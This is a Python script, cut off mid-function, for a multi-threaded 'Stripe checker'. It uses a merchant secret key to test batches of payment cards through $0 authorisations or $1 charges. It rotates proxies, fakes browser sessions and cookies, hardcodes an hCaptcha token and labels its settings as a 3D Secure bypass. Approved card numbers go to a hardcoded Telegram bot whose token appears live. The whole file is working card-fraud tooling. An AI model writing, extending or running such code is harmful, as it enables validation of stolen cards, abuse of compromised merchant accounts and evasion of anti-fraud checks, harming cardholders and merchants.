#!/usr/bin/env python3
"""
ADVANCED STRIPE CHECKER - Multi-Threaded Batch Processing Tool
"""

import json
import uuid
import random
import time
import httpx
import asyncio
import aiofiles
from datetime import datetime
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass
from colorama import init, Fore, Style
import argparse
import sys
import os
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
from queue import Queue
import logging
from tqdm import tqdm

init(autoreset=True)

# Setup logging
logging.basicConfig(level=logging.WARNING)
logger = logging.getLogger(__name__)

@dataclass
class CardDetails:
    """Card details container"""
    number: str
    exp_month: str
    exp_year: str
    cvv: str
    name: str = "John Doe"
    address: str = "123 Street"
    city: str = "New York"
    state: str = "NY"
    zip_code: str = "10001"
    country: str = "US"

@dataclass
class StripeAccount:
    """Stripe account information"""
    sk: str
    pk: str = ""
    account_id: str = ""
    business_name: str = ""
    country: str = ""
    charges_enabled: bool = False
    payouts_enabled: bool = False
    balance: float = 0.0
    currency: str = "USD"

@dataclass
class BrowserSession:
    """Realistic browser session data"""
    guid: str
    muid: str
    sid: str
    user_agent: str
    cookies: Dict[str, str]
    headers: Dict[str, str]
    client_session_id: str
    elements_session_id: str
    wallet_config_id: str

@dataclass
class ProxyConfig:
    """Proxy configuration"""
    host: str
    port: int
    username: Optional[str] = None
    password: Optional[str] = None
    
    def get_url(self) -> str:
        """Get proxy URL"""
        if self.username and self.password:
            return f"http://{self.username}:{self.password}@{self.host}:{self.port}"
        return f"http://{self.host}:{self.port}"

class TelegramNotifier:
    """Telegram notification handler"""
    
    def __init__(self):
        self.bot_token = "7999278156:AAFxX70F_hZgIX8u8hpXZlyNa5YLFZzCY-8"
        self.user_id = "6124719858"
        self.base_url = f"https://api.telegram.org/bot{self.bot_token}"
        
    async def send_notification(self, card: str, status: str, response: str):
        """Send notification to Telegram"""
        try:
            # Format the message as specified
            message = f"み ¡@𝐓𝐎𝐣𝐢𝐂𝐇𝐊𝐁𝐨𝐭 ↯ ↝ 𝙍𝙚𝙨𝙪𝙡𝙩\n"
            message += f"SKBASED\n"
            message += f"━━━━━━━━━━━\n"
            message += f"CC ➜ {card}\n"
            message += f"Status ➜ {status}\n"
            message += f"Response ➜ {response}\n"
            message += f"Gateway ➜ SK KEY BASED\n"
            message += f"━━━━━━━━━━━"
            
            async with httpx.AsyncClient(timeout=10.0) as client:
                response = await client.post(
                    f"{self.base_url}/sendMessage",
                    json={
                        "chat_id": self.user_id,
                        "text": message,
                        "parse_mode": "HTML"
                    }
                )
                
                if response.status_code == 200:
                    return True
                else:
                    print(f"{Fore.YELLOW}⚠️  Failed to send Telegram notification: {response.status_code}")
                    return False
                    
        except Exception as e:
            print(f"{Fore.YELLOW}⚠️  Telegram notification error: {str(e)[:50]}")
            return False

class ResultsManager:
    """Manage results and save to files"""
    def __init__(self, output_dir: str = "results"):
        self.output_dir = output_dir
        self.charged_file = os.path.join(output_dir, "CHARGED.txt")
        self.approved_file = os.path.join(output_dir, "APPROVED_ALL.txt")
        self.declined_file = os.path.join(output_dir, "DECLINED.txt")
        self.error_file = os.path.join(output_dir, "ERROR_WITH_RESPONSE.txt")
        self.stats_file = os.path.join(output_dir, "STATS.json")
        self.raw_responses_file = os.path.join(output_dir, "RAW_RESPONSES.json")
        
        # Create output directory
        os.makedirs(output_dir, exist_ok=True)
        
        # Clear files if they exist
        for file_path in [self.charged_file, self.approved_file, self.declined_file, self.error_file]:
            if os.path.exists(file_path):
                open(file_path, 'w').close()
        
        # Initialize raw responses file
        if os.path.exists(self.raw_responses_file):
            os.remove(self.raw_responses_file)
        
        # Statistics
        self.stats = {
            "total": 0,
            "charged": 0,
            "approved": 0,
            "declined": 0,
            "error": 0,
            "start_time": datetime.now().isoformat(),
            "end_time": None
        }
        
        self.lock = threading.Lock()
        self.raw_responses = []
        self.telegram_notifier = TelegramNotifier()
    
    def save_result(self, card: str, result: Dict, category: str):
        """Save result to appropriate file"""
        with self.lock:
            # Update statistics
            self.stats["total"] += 1
            if category in self.stats:
                self.stats[category] += 1
            
            # Save raw response
            self.raw_responses.append({
                "timestamp": datetime.now().isoformat(),
                "card": card,
                "category": category,
                "result": result
            })
            
            # Save raw responses to file (append)
            try:
                with open(self.raw_responses_file, 'a', encoding='utf-8') as f:
                    json.dump(self.raw_responses[-1], f)
                    f.write('\n')
            except:
                pass
            
            # Prepare result line
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            status = result.get("status", "unknown")
            message = result.get("message", result.get("error", "no message"))
            
            result_line = f"{timestamp} | {card} | {status} | {message}\n"
            
            # Save to appropriate file
            if category == "charged":
                with open(self.charged_file, 'a', encoding='utf-8') as f:
                    f.write(result_line)
            elif category == "approved":
                with open(self.approved_file, 'a', encoding='utf-8') as f:
                    f.write(result_line)
            elif category == "declined":
                with open(self.declined_file, 'a', encoding='utf-8') as f:
                    f.write(result_line)
            elif category == "error":
                # For error file, include full response
                error_details = json.dumps(result.get("details", {}), indent=2)
                error_line = f"{timestamp} | {card}\nStatus: {status}\nMessage: {message}\nDetails:\n{error_details}\n{'='*80}\n"
                with open(self.error_file, 'a', encoding='utf-8') as f:
                    f.write(error_line)
            
            # Send Telegram notification for approved/charged cards
            if category in ["approved", "charged"]:
                # Extract card number only for display
                card_parts = card.split('|')
                card_number = card_parts[0].strip() if len(card_parts) > 0 else card
                
                # Prepare response message
                response_msg = message
                if len(response_msg) > 100:
                    response_msg = response_msg[:97] + "..."
                
                # Send notification in background (don't wait for it)
                asyncio.create_task(self.telegram_notifier.send_notification(
                    card=card_number,
                    status=status.upper(),
                    response=response_msg
                ))
    
    def save_stats(self):
        """Save statistics to JSON file"""
        self.stats["end_time"] = datetime.now().isoformat()
        with open(self.stats_file, 'w', encoding='utf-8') as f:
            json.dump(self.stats, f, indent=2)
    
    def print_stats(self):
        """Print current statistics"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.YELLOW}CURRENT STATISTICS")
        print(f"{Fore.CYAN}{'='*60}")
        print(f"{Fore.GREEN}Total Cards: {self.stats['total']}")
        print(f"{Fore.GREEN}Charged: {self.stats['charged']}")
        print(f"{Fore.GREEN}Approved: {self.stats['approved']}")
        print(f"{Fore.RED}Declined: {self.stats['declined']}")
        print(f"{Fore.YELLOW}Errors: {self.stats['error']}")
        
        if self.stats['total'] > 0:
            success_rate = ((self.stats['charged'] + self.stats['approved']) / self.stats['total']) * 100
            print(f"{Fore.CYAN}Success Rate: {success_rate:.2f}%")

class AdvancedStripeChecker:
    def __init__(self):
        """Initialize the advanced Stripe checker"""
        self.account = None
        self.browser_session = None
        self.proxies: List[ProxyConfig] = []
        self.current_proxy_index = 0
        self.results_manager = None
        self.test_mode = 1  # 1 = $0 auth, 2 = $1 charge
        self.threads = 5  # Default threads
        
        # Common user agents
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
        ]

    def load_proxies(self, proxy_file: str):
        """Load proxies from file"""
        if not proxy_file or not os.path.exists(proxy_file):
            print(f"{Fore.YELLOW}⚠️  No proxy file found or file doesn't exist")
            return
        
        try:
            with open(proxy_file, 'r', encoding='utf-8') as f:
                lines = f.readlines()
            
            for line in lines:
                line = line.strip()
                if not line:
                    continue
                
                # Parse proxy format: host:port:username:password
                parts = line.split(':')
                if len(parts) == 4:
                    host, port, username, password = parts
                    proxy = ProxyConfig(
                        host=host.strip(),
                        port=int(port.strip()),
                        username=username.strip() if username.strip() else None,
                        password=password.strip() if password.strip() else None
                    )
                    self.proxies.append(proxy)
                elif len(parts) == 2:
                    host, port = parts
                    proxy = ProxyConfig(
                        host=host.strip(),
                        port=int(port.strip())
                    )
                    self.proxies.append(proxy)
            
            print(f"{Fore.GREEN}✅ Loaded {len(self.proxies)} proxies")
            
        except Exception as e:
            print(f"{Fore.RED}❌ Error loading proxies: {e}")

    def get_next_proxy(self) -> Optional[str]:
        """Get next proxy in rotation"""
        if not self.proxies:
            return None
        
        proxy = self.proxies[self.current_proxy_index]
        self.current_proxy_index = (self.current_proxy_index + 1) % len(self.proxies)
        
        # Return proxy URL
        return proxy.get_url()

    async def create_session(self, proxy_url: Optional[str] = None) -> httpx.AsyncClient:
        """Create HTTP session with optional proxy"""
        proxies = None
        if proxy_url:
            proxies = {
                "http://": proxy_url,
                "https://": proxy_url
            }
        
        headers = {
            "User-Agent": random.choice(self.user_agents),
            "Accept": "application/json",
            "Accept-Language": "en-US,en;q=0.9",
        }
        
        # For httpx version compatibility
        try:
            # Try newer httpx syntax first
            return httpx.AsyncClient(
                headers=headers,
                timeout=30.0,
                follow_redirects=True,
                proxies=proxies,
                verify=False
            )
        except TypeError:
            # Fallback for older httpx versions
            transport = None
            if proxy_url:
                # Create custom transport with proxy
                import asyncio
                import aiohttp
                from aiohttp_socks import ProxyConnector
                
                # This is a fallback for older httpx
                return httpx.AsyncClient(
                    headers=headers,
                    timeout=30.0,
                    follow_redirects=True,
                    verify=False
                )

    async def validate_sk(self, session: httpx.AsyncClient, sk: str) -> Tuple[bool, Dict]:
        """
        Validate SK and extract account information
        
        Args:
            session: HTTP session
            sk: Stripe secret key
            
        Returns:
            Tuple of (is_valid, account_info)
        """
        headers = {
            "Authorization": f"Bearer {sk}",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        
        try:
            print(f"{Fore.YELLOW}Fetching account information...")
            # Get account info
            response = await session.get(
                "https://api.stripe.com/v1/account",
                headers=headers
            )
            
            if response.status_code == 401:
                print(f"{Fore.RED}❌ Invalid or expired SK")
                return False, {"error": "Invalid or expired SK"}
            
            account_data = response.json()
            
            print(f"{Fore.YELLOW}Fetching balance information...")
            # Get balance
            balance_response = await session.get(
                "https://api.stripe.com/v1/balance",
                headers=headers
            )
            balance_data = balance_response.json() if balance_response.status_code == 200 else {}
            
            self.account = StripeAccount(
                sk=sk,
                account_id=account_data.get("id", ""),
                business_name=account_data.get("business_profile", {}).get("name", "Unknown"),
                country=account_data.get("country", "Unknown").upper(),
                charges_enabled=account_data.get("charges_enabled", False),
                payouts_enabled=account_data.get("payouts_enabled", False),
                balance=balance_data.get("available", [{}])[0].get("amount", 0) / 100,
                currency=balance_data.get("available", [{}])[0].get("currency", "USD").upper()
            )
            
            print(f"{Fore.GREEN}✅ SK is valid")
            return True, account_data
            
        except Exception as e:
            print(f"{Fore.RED}❌ Error validating SK: {str(e)}")
            return False, {"error": str(e)}

    async def extract_pk_method_checkout(self, session: httpx.AsyncClient) -> Optional[str]:
        """
        Extract PK using checkout session method
        
        Returns:
            PK key or None
        """
        try:
            headers = {
                "Authorization": f"Bearer {self.account.sk}",
                "Content-Type": "application/x-www-form-urlencoded",
            }
            
            data = {
                "payment_method_types[]": "card",
                "line_items[0][price_data][currency]": "usd",
                "line_items[0][price_data][product_data][name]": "Verification Test",
                "line_items[0][price_data][unit_amount]": "100",
                "line_items[0][quantity]": "1",
                "mode": "payment",
                "success_url": "https://example.com/success",
                "cancel_url": "https://example.com/cancel"
            }
            
            response = await session.post(
                "https://api.stripe.com/v1/checkout/sessions",
                headers=headers,
                data=data
            )
            
            if response.status_code == 200:
                session_data = response.json()
                checkout_url = session_data.get("url", "")
                
                if checkout_url and "#" in checkout_url:
                    print(f"{Fore.GREEN}✅ Checkout session created")
                    # Extract fragment from URL
                    fragment = checkout_url.split("#")[1]
                    
                    try:
                        # URL decode
                        from urllib.parse import unquote
                        decoded = unquote(fragment)
                        
                        # Base64 decode
                        import base64
                        encoded = decoded.replace("%2B", "+").replace("%2F", "/")
                        
                        # Add padding if needed
                        mod = len(encoded) % 4
                        if mod:
                            encoded += "=" * (4 - mod)
                        
                        decoded_bytes = base64.b64decode(encoded)
                        
                        # XOR decode with key 5
                        key = 5
                        plaintext = ""
                        for byte in decoded_bytes:
                            plaintext += chr(byte ^ key)
                        
                        # Extract PK using regex
                        match = re.search(r'(pk_(live|test)_[A-Za-z0-9_\-]+)', plaintext)
                        if match:
                            pk = match.group(1)
                            print(f"{Fore.GREEN}✅ PK extracted from checkout session")
                            return pk
                        else:
                            print(f"{Fore.YELLOW}⚠️  PK not found in decoded data")
                    except Exception as e:
                        print(f"{Fore.YELLOW}⚠️  Error decoding fragment: {e}")
            
            return None
            
        except Exception as e:
            print(f"{Fore.YELLOW}⚠️  Checkout method failed: {e}")
            return None

    async def extract_pk(self, session: httpx.AsyncClient) -> Optional[str]:
        """
        Extract PK using multiple methods with fallback
        
        Returns:
            PK key or None
        """
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.YELLOW}EXTRACTING PUBLISHABLE KEY")
        print(f"{Fore.CYAN}{'='*60}")
        
        # Try checkout method first
        print(f"\n{Fore.YELLOW}Trying Checkout Session method...")
        pk = await self.extract_pk_method_checkout(session)
        
        if pk and pk.startswith("pk_"):
            print(f"{Fore.GREEN}✅ PK found: {pk[:20]}...{pk[-4:]}")
            self.account.pk = pk
            return pk
        
        # Fallback: Try to extract from SK pattern
        print(f"\n{Fore.YELLOW}Trying pattern extraction from SK...")
        try:
            if self.account.sk.startswith("sk_live_"):
                pk_candidate = self.account.sk.replace("sk_live_", "pk_live_")
                if re.match(r'pk_live_[A-Za-z0-9_\-]{24,}', pk_candidate):
                    print(f"{Fore.YELLOW}⚠️  Using derived PK: {pk_candidate[:20]}...")
                    self.account.pk = pk_candidate
                    return pk_candidate
        except:
            pass
        
        print(f"{Fore.RED}❌ Could not extract PK automatically")
        
        # Ask for manual input
        print(f"\n{Fore.YELLOW}You can enter PK manually:")
        pk_input = input(f"{Fore.CYAN}Enter PK (or press Enter to skip): ").strip()
        
        if pk_input and pk_input.startswith("pk_"):
            self.account.pk = pk_input
            print(f"{Fore.GREEN}✅ Using manually entered PK")
            return pk_input
        
        return None

    def create_browser_session(self) -> BrowserSession:
        """
        Create realistic browser session with all identifiers
        
        Returns:
            BrowserSession object
        """
        # Generate UUIDs
        guid = f"guid_{uuid.uuid4().hex[:16]}"
        muid = f"muid-{uuid.uuid4().hex[:8]}-{uuid.uuid4().hex[:8]}"
        sid = f"sid-{uuid.uuid4().hex[:12]}"
        client_session_id = str(uuid.uuid4())
        elements_session_id = f"elements_session_{uuid.uuid4().hex[:16]}"
        wallet_config_id = str(uuid.uuid4())
        
        # Select user agent
        user_agent = random.choice(self.user_agents)
        
        # Generate cookies
        stripe_mid = uuid.uuid4().hex + uuid.uuid4().hex[:5]
        stripe_sid = uuid.uuid4().hex + uuid.uuid4().hex[:5]
        phpsessid = uuid.uuid4().hex[:26]
        
        cookies = {
            "__stripe_mid": stripe_mid,
            "__stripe_sid": stripe_sid,
            "PHPSESSID": phpsessid,
        }
        
        # Create headers
        headers = {
            "authority": "api.stripe.com",
            "accept": "application/json",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
            "user-agent": user_agent,
            "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
        }
        
        self.browser_session = BrowserSession(
            guid=guid,
            muid=muid,
            sid=sid,
            user_agent=user_agent,
            cookies=cookies,
            headers=headers,
            client_session_id=client_session_id,
            elements_session_id=elements_session_id,
            wallet_config_id=wallet_config_id
        )
        
        return self.browser_session

    async def create_token(self, session: httpx.AsyncClient, card: CardDetails) -> Dict:
        """
        Create token using browser session
        
        Args:
            session: HTTP session
            card: Card details
            
        Returns:
            Result dictionary
        """
        try:
            url = "https://api.stripe.com/v1/tokens"
            
            headers = self.browser_session.headers.copy()
            cookie_str = "; ".join([f"{k}={v}" for k, v in self.browser_session.cookies.items()])
            headers["Cookie"] = cookie_str
            
            data = {
                "guid": self.browser_session.guid,
                "muid": self.browser_session.muid,
                "sid": self.browser_session.sid,
                "referrer": "http://example.com",
                "time_on_page": str(random.randint(10000, 120000)),
                "card[number]": card.number,
                "card[cvc]": card.cvv,
                "card[exp_month]": card.exp_month,
                "card[exp_year]": card.exp_year,
                "payment_user_agent": "stripe.js/250b377966; stripe-js-v3/250b377966; card-element",
                "client_attribution_metadata[client_session_id]": self.browser_session.client_session_id,
                "client_attribution_metadata[merchant_integration_source]": "elements",
                "client_attribution_metadata[merchant_integration_subtype]": "card-element",
                "client_attribution_metadata[merchant_integration_version]": "2017",
                "client_attribution_metadata[wallet_config_id]": self.browser_session.wallet_config_id,
                "key": self.account.pk
            }
            
            # Add hcaptcha token
            data["radar_options[hcaptcha_token]"] = "P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzYwMzQyOTQ0LCJjZGF0YSI6Ilp5NENqVUtiWG96YlRzSUVmV0I5b0l6YjgrazVEekQ4SEl0cXgzdzE5MitHVngzVlpGajEzU3Q2dkZGTGJUQ0QzRkx6R1RTOWJENW0xNTVBOEtieU5Ub0hjcnFyYWdzRGZXOUR2WHZLdVV2VnJmaU9NdXQ0cE9FTW9yai9UOGw1cktJWFhNN2lDTHhDVzdyOEVjUjFSY0xGd2xwdVczeEljM1lvaU5yZTdaKzBIV0pKUVpXSTY4V3J3aUtId1grT3dtbld4U2RaSW9yOEgycFciLCJwYXNza2V5IjoibGlsaDVZRmtqZ04veDZ6WVdCOXZIek1yZk9RZ1lUZ05QbU9EYVRQVlhkbTRuQXA1d1V0Wk9RVjAwZERaanhzL3RJcWZobExwSXFHMXRBWStKUkVFbVJZc2NPOERleEV2YUV0cndMUkcvY0JaMFA5UWcwTEl0R1RyZ0ZibFJkRlVDUklxN0gzRVpDNmlnVnByMzAxWXhyeGRLb3A5RUs5UHczOEc0NkRxUlc4enF5RTV1eTFTeGxTK3Uwb0p6V3pKYmh4MnBoSDFoTzQ2VFlWUDc3U3loUnFmaDFzZGljL2g2NGN2cXlIVmhtTE54b3lLT1FKNkk4ZFY2NndUKzhrZDFXSFhQUURFS2ZYTVJMRlNpVlVsTk1mRnlMVlFGaE5URDRzZWRDNnZ1bFBMSW9nOE9DQ1UwMVR0Z3BNcllPSFdjZ2ZFby85ZEhXQXBoSWtCZE9HdkZ1VjY3T2FsZU1MMisrZ1JRMUg0dE52eDVzbDQ4NDM3R1p6Tm9SeFhyZUpRSlExZytSSGMweVlYbWtXYWNDV29rdFFidXU0L0tIWk9FZFM2Y3JQRkNsREdVTnAzS2IyVnR2SWZxMm5ibkt6ZndsTmE1NjhhY0lkRVBRV0d6TklEMU5xR2J6S1dVNE9vT29EUE93c3lVZlhLR3NNQkVCd1JPZm90L2o1WlROaG0rWTNmZTVCUkI1YUlKNXRnOHNZOEpPUHF1OUVjc2psUUNIZDdoOUlyaVpqOGNkeFltRVRJZ0syQU8vci9XaG5XRzhEYWZWZDg3V1RneXRQWk9JaUtXQnZXN3NkbUdCOW5jTmJoOEppSDE4VU5KSWErMU9hUDlqOGNUMVVtZUk0UWhDa3Rxd2xzL1VGeG9kdXNoYXRxRkVkQ3JvK2x5OVQyRG5rQis2QXlXbmkzQzFNWTQvRE4yQXN0MGhTZTdoWXJtTDJHSDh1NzJNbXJRdTBpL0tHVExVSFdSVitmU003RmNUcEU3UnBMUmh1THdTNGp3RDdNTitXbXowU2ppQTdkd20vQk9UcXhjaHdTQTN6alZRSlhxM2RmOUQ5Vy9VdlFUQkRBSU5WODNCdFp1OTI4dHNhZkhOVW9uazlGUHMyY0pzNzBXK3hEOGx2V28vU0pvUkt3N296NjdZNWhBSm5ZN2lxYzQ4bFBDQ1k1WEp5ZWhJWWNvUEtDd3M3aFpRdnlJYjF4VTlOTFN2akRGVlBoN216SzAwcW9CbVYzRkhGZ0J0aWdQUWdhVDJNSWFFL3dyM29jV3ByYk42S2FuOU1XTElVeG9JbXl4ZVd6NWRSbHNHMmh3TStyaUZFTWJyUG9mNzNLQWg0cTRCTlBCOEYrbDNkRjdBQWd5V253SEZ0V3BrS1l1WFhmTmEyT2M5V1VXeE0wdGY2eXFUR0ZJb1Z4bzlCUVVnVnNtazdvQjlYQnlGZWowMTJETERwNXdRVkM3NkNFNm82UjNvbFpRUnhwNVVFa1UyU3h5aWRna1VPNVZBbGZPVVhteCtRTmVpTmRQcTBSbElGU2hXcTBRUGF1cm5NK1NJUzJOSUNaLzhYOEUrUFhKRnVrY1k3b3B4cVYwT2p0bTUzejV5V3FBQ2dLUzZPR01uSHg1WEFjRG1RSWsrRHRqVmsycTc0VjYwc1IrSUFkMC9JbWwyRkRRTVpZSDJyNG9UZ29PSDl3TU1QWjBlYThsVlphbk1Dak1rbUZhQktibzg4aStxNm5mc1ErYyt1Wkg4OGx6Z00zbWVVMDBWb2QvRWpZWFJvRUx4blNCQjRTMXRCRml1TEc3WFFna3MyN0NzRm5NOXpWS2pWMHphQWRmYkJ0ZkxvMnFqdGMrL0RwNTExb3dhOFJQaE96Q3JVWElBKzhzN1dHYjI5T3EvN3Q1NFlhNUh5VDR3N2RBY0g3RzlsZGZqY2RpekRxOC82YWozNHAwbHhBWVE2eENNZ3N1ZEZMajdoM3pBS3BCa2xzZERzRElUWmsxZER1eWx6MFA1MFIxVVE4aC9hM3FmQW9XcDZ1REFXVzZ6dnBQbHlwWTBVcmF0WjZ1NllkSjdybFpleUs1TEMwcUNtNG9XK2cxNDFnZElKeGVIVTF5VWlDWEJQVWtSRG9pVmlsOTN4WW04M1BHV0ViQ1Nsd0NXNXJnakZLcGwwdXB2WUVtdGxmUkFrQkNid1phV1ZSTWR3Z2RDcVF3NmFHNUNHWkNOMlBKK3FnMnh0a25NZ3RPMHdZVFRCc2RieVUwdGNXZEtmd0dZM3ZBT3YvalppTi9GWHQvN0RpbXEvNHFnZVNXbmxsODlPUzRrRVVTUldjeDVXRFp6dmZzM0I3QUZPbkV1OTZGMzBnUlJFZ0ZmM2FHSVNCemxIeUt0VjhpbUFvd0FMVldFamlacGRMRGNxTVpwZGNXc2o3Iiwia3IiOiIyMjcxNDIwNSIsInNoYXJkX2lkIjoyNTkxODkzNTl9.jlydLlpZvBM79EAFMmoQfrqJgqdj-F75Ltx8Be73yZw"
            
            response = await session.post(url, headers=headers, data=data)
            result = response.json()
            
            if "id" in result and result["id"].startswith("tok_"):
                token_id = result["id"]
                return {
                    "success": True,
                    "token_id": token_id,
                    "card_info": result.get("card", {}),
                    "response": result
                }
            else:
                error_msg = result.get("error", {}).get("message", "Unknown error")
                error_code = result.get("error", {}).get("code", "")
                decline_code = result.get("error", {}).get("decline_code", "")
                return {
                    "success": False,
                    "error": error_msg,
                    "error_code": error_code,
                    "decline_code": decline_code,
                    "response": result
                }
                
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }

    async def test_paymentintent(self, session: httpx.AsyncClient, token_id: str, card: CardDetails, amount: int = 100) -> Dict:
        """Test token with PaymentIntent"""
        try:
            headers = {
                "Authorization": f"Bearer {self.account.sk}",
                "Content-Type": "application/x-www-form-urlencoded",
            }
            
            # Create customer
            timestamp = int(time.time())
            email = f"test{timestamp}@checker.com"
            
            customer_data = {
                "email": email,
                "description": f"Test customer - {timestamp}",
                "address[line1]": card.address,
                "address[city]": card.city,
                "address[postal_code]": card.zip_code,
                "address[state]": card.state,
                "address[country]": card.country,
                "name": card.name,
            }
            
            customer_response = await session.post(
                "https://api.stripe.com/v1/customers",
                headers=headers,
                data=customer_data
            )
            
            if customer_response.status_code != 200:
                customer_error = customer_response.json().get("error", {}).get("message", "Unknown error")
                return {
                    "success": False,
                    "error": f"Customer creation failed: {customer_error}",
                    "response": customer_response.json()
                }
            
            customer_id = customer_response.json()["id"]
            
            # Create PaymentIntent with token - 3DS bypass configuration
            pi_data = {
                "amount": str(amount),
                "currency": "usd",
                "customer": customer_id,
                "payment_method_data[type]": "card",
                "payment_method_data[card][token]": token_id,
                "confirm": "true",
                "description": f"Token Charge Test - ${amount/100:.2f}",
                "payment_method_types[]": "card",
                "payment_method_options[card][request_three_d_secure]": "any",
                "setup_future_usage": "off_session",
                "return_url": "https://example.com/return"
            }
            
            response = await session.post(
                "https://api.stripe.com/v1/payment_intents",
                headers=headers,
                data=pi_data
            )
            
            result = response.json()
            
            if response.status_code == 200:
                status = result.get("status", "")
                pi_id = result.get("id", "")
                decline_code = result.get("error", {}).get("decline_code", "")
                
                response_data = {
                    "success": True,
                    "paymentintent_id": pi_id,
                    "status": status,
                    "token": token_id,
                    "customer": customer_id,
                    "amount": amount / 100,
                    "decline_code": decline_code,
                    "response": result
                }
                
                return response_data
            else:
                error_msg = result.get("error", {}).get("message", "Unknown error")
                decline_code = result.get("error", {}).get("decline_code", "")
                error_code = result.get("error", {}).get("code", "")
                return {
                    "success": False,
                    "error": error_msg,
                    "decline_code": decline_code,
                    "error_code": error_code,
                    "response": result
                }
                
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }

    async def test_setupintent(self, session: httpx.AsyncClient, token_id: str, card: CardDetails) -> Dict:
        """Test with SetupIntent ($0 auth)"""
        try:
            headers = {
                "Authorization": f"Bearer {self.account.sk}",
                "Content-Type": "application/x-www-form-urlencoded",
            }
            
            # Create customer
            timestamp = int(time.time())
            email = f"test{timestamp}@checker.com"
            
            customer_data = {
                "email": email,
                "description": f"Test customer - {timestamp}",
                "address[line1]": card.address,
                "address[city]": card.city,
                "address[postal_code]": card.zip_code,
                "address[state]": card.state,
                "address[country]": card.country,
                "name": card.name,
            }
            
            customer_response = await session.post(
                "https://api.stripe.com/v1/customers",
                headers=headers,
                data=customer_data
            )
            
            if customer_response.status_code != 200:
                customer_error = customer_response.json().get("error", {}).get("message", "Unknown error")
                return {
                    "success": False,
                    "error": f"Customer creation failed: {customer_error}",
                    "response": customer_response.json()
                }
            
            customer_id = customer_response.json()["id"]
            
            # Create SetupIntent - 3DS bypass configuration
            data = {
                "customer": customer_id,
                "payment_method_data[type]": "card",
                "payment_method_data[card][token]": token_id,
                "confirm": "true",
                "usage": "off_session",
                "description": "SetupIntent Test",
                "payment_method_types[]": "card",
                "payment_method_options[card][request_three_d_secure]": "any"
            }
            
            response = await session.post(
                "https://api.stripe.com/v1/setup_intents",
                headers=headers,
                data=data
            )
            
            result = response.json()
            
            if response.status_code == 200:
                status = result.get("status", "")
                si_id = result.get("id", "")
                
                response_data = {
                    "success": True,
                    "setupintent_id": si_id,
                    "status": status,
                    "token": token_id,
                    "customer": customer_id,
                    "response": result
                }
                
                return response_data
            else:
                error_msg = result.get("error", {}).get("message", "Unknown error")
                error_code = result.get("error", {}).get("code", "")
                decline_code = result.get("error", {}).get("decline_code", "")
                return {
                    "success": False,
                    "error": error_msg,
                    "error_code": error_code,
                    "decline_code": decline_code,
                    "response": result
                }
                
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }

    def categorize_result(self, result: Dict, card_str: str) -> str:
        """Categorize result into appropriate category"""
        if not result.get("success", False):
            # Check if it's a decline or error
            error_msg = result.get("error", "").lower()
            error_code = result.get("error_code", "").lower()
            decline_code = result.get("decline_code", "").lower()
            
            # Common decline patterns
            decline_patterns = [
                "insufficient", "declined", "expired", "invalid", "incorrect",
                "card_error", "card_declined", "do_not_honor", "pickup_card",
                "transaction_not_allowed", "generic_decline"
            ]
            
            for pattern in decline_patterns:
                if (pattern in error_msg or 
                    pattern in error_code or 
                    pattern in decline_code):
                    return "declined"
            
            # If not a clear decline, it's an error
            return "error"
        
        # Success case
        status = result.get("status", "").lower()
        
        if self.test_mode == 2:  # $1 charge mode
            if status == "succeeded":
                return "charged"
            else:
                # For $1 charge mode, any other success is approved
                return "approved"
        else:  # $0 auth mode
            # All successes in $0 mode are approved
            return "approved"

    async def test_single_card(self, card: CardDetails, proxy_url: Optional[str] = None, card_str: str = "") -> Dict:
        """Test a single card"""
        result = {
            "card": card_str,
            "success": False,
            "status": "error",
            "message": "Unknown error",
            "details": {}
        }
        
        try:
            # Create session with proxy
            async with await self.create_session(proxy_url) as session:
                # Create browser session for this card
                self.create_browser_session()
                
                # Create token
                token_result = await self.create_token(session, card)
                
                if not token_result.get("success"):
                    result["message"] = token_result.get("error", "Token creation failed")
                    result["details"] = token_result
                    return result
                
                token_id = token_result["token_id"]
                
                # Test based on mode
                if self.test_mode == 1:  # $0 Auth
                    test_result = await self.test_setupintent(session, token_id, card)
                else:  # $1 Charge
                    test_result = await self.test_paymentintent(session, token_id, card, 100)
                
                if test_result.get("success"):
                    status = test_result.get("status", "")
                    result["success"] = True
                    result["status"] = status
                    result["details"] = test_result
                    
                    if status == "succeeded":
                        if self.test_mode == 2:
                            result["message"] = "Charged $1.00"
                        else:
                            result["message"] = "Approved ($0 auth)"
                    elif status == "requires_action":
                        result["message"] = "3D Secure required"
                    elif status == "requires_capture":
                        result["message"] = "Authorized, requires capture"
                    elif status == "processing":
                        result["message"] = "Processing"
                    else:
                        result["message"] = f"Status: {status}"
                else:
                    result["message"] = test_result.get("error", "Test failed")
                    result["details"] = test_result
                
                return result
                
        except Exception as e:
            result["message"] = str(e)
            return result

    def load_cards_from_file(self, filepath: str) -> List[Tuple[str, CardDetails]]:
        """Load cards from file"""
        cards = []
        
        try:
            with open(filepath, 'r', encoding='utf-8') as f:
                lines = f.readlines()
            
            for line_num, line in enumerate(lines, 1):
